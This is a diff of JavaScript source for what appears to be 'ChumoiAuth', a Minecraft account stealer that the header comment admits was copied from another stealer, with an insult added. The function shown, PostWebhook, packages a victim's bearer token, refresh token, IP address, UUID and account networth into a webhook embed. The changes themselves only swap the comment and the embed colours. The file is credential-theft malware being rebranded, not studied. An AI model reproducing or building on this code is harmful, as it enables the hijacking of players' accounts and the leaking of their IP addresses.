@@ -1,4 +1,4 @@
-// gute nacht was here !
+// chumoi is rial (skidded from bodyauth so fuck you meinaimsuckt)
 
 // import modules
 const networthCalc = require('./utils/Networth');
@@ -299,7 +299,7 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
             {
             "title": "ChumoiAuth",
             "description": embeddescription,
-            "color":  0x7289DA,
+            "color":  0x8000ff,
             "author": {
                     "name": networthtext,
             },
@@ -349,7 +349,7 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
     if (description != "No profile data found. 🙁") {
         embed.embeds.push({
             title: "🌍 Skyblock Profile Info",
-            color: 0x7289DA,
+            color: 0x8000ff,
             fields: description,
             url: "https://sky.shiiyu.moe/stats/" + username,
             footer: {
@@ -359,7 +359,7 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
     } else {
         embed.embeds.push({
             title: "🌍 Skyblock Profile Info",
-            color: 0x7289DA,
+            color: 0x8000ff,
             description: "No profile data found. 🙁",
             url: "https://sky.shiiyu.moe/stats/" + username,
             footer: {
